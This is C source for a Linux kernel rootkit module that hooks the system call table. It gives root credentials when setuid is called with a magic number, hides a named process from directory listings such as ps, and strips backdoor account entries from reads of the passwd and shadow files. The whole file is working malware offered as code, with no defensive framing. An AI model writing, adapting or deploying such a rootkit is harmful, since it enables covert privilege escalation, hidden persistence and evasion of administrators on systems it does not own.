#include "includes.h"

unsigned long** sys_call_table;

asmlinkage long hacked_setuid(uid_t uid)
{
    long ret = 0;
    struct cred *new;
    printk(KERN_INFO "intercepted setuid: %d\n", uid);

    //if the requested uid is the "magic number" to give root priv
    if (uid == MAGIC_NUMBER) {
        DEBUG("Magic Number passed in, elevating privilege");
        new = prepare_creds();
        if (!new)
            return -ENOMEM;
        //set root priveleges
        new->uid = GLOBAL_ROOT_UID;
        new->gid = GLOBAL_ROOT_GID;
        new->suid = GLOBAL_ROOT_UID;
        new->sgid = GLOBAL_ROOT_GID;
        new->euid = GLOBAL_ROOT_UID;
        new->egid = GLOBAL_ROOT_GID;
        new->fsuid = GLOBAL_ROOT_UID;
        new->fsgid = GLOBAL_ROOT_GID;

        ret = commit_creds(new);
    }
    else {
        ret = (*orig_setuid) (uid);
    }

    return ret;
}

asmlinkage long hacked_getdents(unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count)
{
    unsigned int dent_offset = 0;
    long getdents_ret;
    int error;
    size_t dir_name_len;
    struct linux_dirent *cur_dirent, *next_dirent;
    struct file *fd_file;
    struct inode *fd_inode;
    struct pid *pid;
    struct task_struct *proc_task;
    char *proc_name, *dirent_ptr = (char *)dirp, *dir_name;
    struct files_struct *open_files = current->files;
    int is_ps = 0;
    pid_t pid_num;
    DEBUG("Entering hacked getdents");
    // Call original getdents system call.
    getdents_ret = (*orig_getdents)(fd, dirp, count);
    spin_lock(&open_files->file_lock);
    fd_file = fcheck(fd);
    if (unlikely(!fd_file)) {
        goto exit_unlock;
    }
    fd_inode = file_inode(fd_file);
    printk("fd_inode->i_ino: %lu", fd_inode->i_ino);
    printk("MAJOR->MAJOR: %i", imajor(fd_inode));
    printk("MINOR->MINOR: %i", iminor(fd_inode));
    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
        && iminor(fd_inode) == 0)
    {
        DEBUG("User typed command ps");
        is_ps = 1;
    }

    if (is_ps != 0) {
        // getdents_ret is number of bytes read
        for (dent_offset = 0; dent_offset < getdents_ret;)
        {
            cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
            dir_name = cur_dirent->d_name;
            dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
            error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
            if (error < 0)
            {
                goto next_getdent;
            }
            pid = find_get_pid(pid_num);
            if (!pid)
            {
                goto next_getdent;
            }
            printk("proc_task%p\n", pid);
            proc_task = get_pid_task(pid, PIDTYPE_PID);
            printk("proc_task%p\n", proc_task);
            if (!proc_task)
            {
                goto next_getdent;
            }
            proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
            if (!proc_name)
            {
                goto next_getdent;
            }
            proc_name = get_task_comm(proc_name, proc_task);
            if (strncmp(proc_name, HIDDEN_PROCESS, strlen(HIDDEN_PROCESS)) == 0)
            {
                // Hide the process by deleting its dirent: shift all its right dirents to left.
                printk("%s work needs to be done to hide", HIDDEN_PROCESS);
                next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
                memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
                getdents_ret -= cur_dirent->d_reclen;
                dent_offset -= cur_dirent->d_reclen;
            }
            // goto exit_unlock;
            printk("dir_name:%s\n", dir_name);
            printk("proc_name%s\n", proc_name);
            printk("pid_num:%i\n", pid_num);
            kfree(proc_name);
        next_getdent:
            dent_offset += cur_dirent->d_reclen;
        }
        DEBUG("Exiting ps filter");
    }
exit_unlock:
    DEBUG("Exiting hacked getdents");
    spin_unlock(&open_files->file_lock);
    return getdents_ret;
}

asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
{
	unsigned long ret;

	char *tmp;
	char *pathname;

	struct file *file;
	struct path *path;

	char *tmp_buf;

	ret = (*orig_read)(fd, buf, count);

	if(ret <= 0){
		return ret;
	}

	file = fget(fd);

	if(!file){
		DEBUG("file doesn't exist");
		return ret;
	}

	path = &file->f_path;
	path_get(path);

	tmp = (char *)__get_free_page(GFP_TEMPORARY);

	if(!tmp){
		path_put(path);
		DEBUG("couldnt create tmp");
		return ret;
	}

	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);

	if(IS_ERR(pathname)){
		free_page((unsigned long)tmp);
		DEBUG("pathname errors");
		return ret;
	}

	free_page((unsigned long)tmp);

	if(strcmp(pathname, PASSWD_FILE)==0){

		if(!(strstr(buf, BACKDOOR_PASSWD))){
			return ret;
		}

		tmp_buf = kmalloc(ret, GFP_KERNEL);
		if(!tmp_buf){
			return ret;
		}

		copy_from_user(tmp_buf, buf, ret);

		if(!tmp_buf){
			kfree(tmp_buf);
			return ret;
		}

		if((strstr(tmp_buf, BACKDOOR_PASSWD))){
			char *strBegin  = tmp_buf;
			char *substrBegin = strstr(strBegin, BACKDOOR_PASSWD);
			char *substrEnd = substrBegin + strlen(BACKDOOR_PASSWD);
			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
			memmove(substrBegin, substrEnd, remaining_length);
			ret = ret - strlen(BACKDOOR_PASSWD);
		}

		copy_to_user(buf, tmp_buf, ret);
		kfree(tmp_buf);
	}

	if(strcmp(pathname, SHADOW_FILE)==0){

		if(!(strstr(buf, BACKDOOR_SHADOW))){
			return ret;
		}
		
		tmp_buf = kmalloc(ret, GFP_KERNEL);
		if(!tmp_buf){
			return ret;
		}

		copy_from_user(tmp_buf, buf, ret);

		if(!tmp_buf){
			kfree(tmp_buf);
			return ret;
		}

		if((strstr(tmp_buf, BACKDOOR_SHADOW))){
			char *strBegin  = tmp_buf;
			char *substrBegin = strstr(strBegin, BACKDOOR_SHADOW);
			char *substrEnd = substrBegin + strlen(BACKDOOR_SHADOW);
			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
			memmove(substrBegin, substrEnd, remaining_length);
			ret = ret - strlen(BACKDOOR_SHADOW);
		}

		copy_to_user(buf, tmp_buf, ret);
		kfree(tmp_buf);		
	}

	return ret;	
}

void set_addr_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    if (pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;
}

void set_addr_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;
}

void init_hide_processes(void)
{
    HOOK_SYSCALL(sys_call_table, orig_getdents, hacked_getdents, __NR_getdents);
}

void exit_hide_processes(void)
{
    UNHOOK_SYSCALL(sys_call_table, orig_getdents, __NR_getdents);
}

void init_filter_backdoor(void)
{
	HOOK_SYSCALL(sys_call_table, orig_read, hacked_read, __NR_read);
}

void exit_filter_backdoor(void)
{
	UNHOOK_SYSCALL(sys_call_table, orig_read, __NR_read);
}

static int __init initModule(void)
{
    sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Rootkit error: can't find sys_call_table memory location\n");
        return -ENOENT;
    }

    set_addr_rw((unsigned long) sys_call_table);

    HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);

    init_hide_processes();

    init_filter_backdoor();

    set_addr_ro((unsigned long) sys_call_table);

    DEBUG("loaded module");
    // Non-zero return means that the module couldn't be loaded.
    return 0;
}

static void __exit exitModule(void)
{
    set_addr_rw((unsigned long) sys_call_table);

    UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);

    exit_hide_processes();

    exit_filter_backdoor();

    set_addr_ro((unsigned long) sys_call_table);
    DEBUG("exiting module");
}

module_init(initModule);
module_exit(exitModule);
MODULE_LICENSE("GPL");
